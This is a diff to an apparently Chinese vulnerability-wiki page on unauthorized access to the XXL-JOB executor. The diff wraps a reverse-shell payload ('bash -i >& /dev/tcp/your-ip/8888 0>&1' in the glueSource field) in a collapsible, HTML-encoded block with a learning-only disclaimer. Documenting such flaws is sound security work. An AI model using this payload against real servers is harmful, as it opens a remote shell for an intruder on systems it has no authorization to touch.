@@ -98,9 +98,12 @@ Content-Length: 365
 
 执行反弹 shell 命令：
 
-```
-"glueSource": "bash -i >& /dev/tcp/your-ip/8888 0>&1 "
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">"glueSource": "&#98;ash -i &gt;&amp; &#47;dev/tcp/your-ip/8888 0&gt;&amp;1 "</code></pre>
+
+</details>
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/XXL-JOB%20executor%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20241112150237169.png)
 
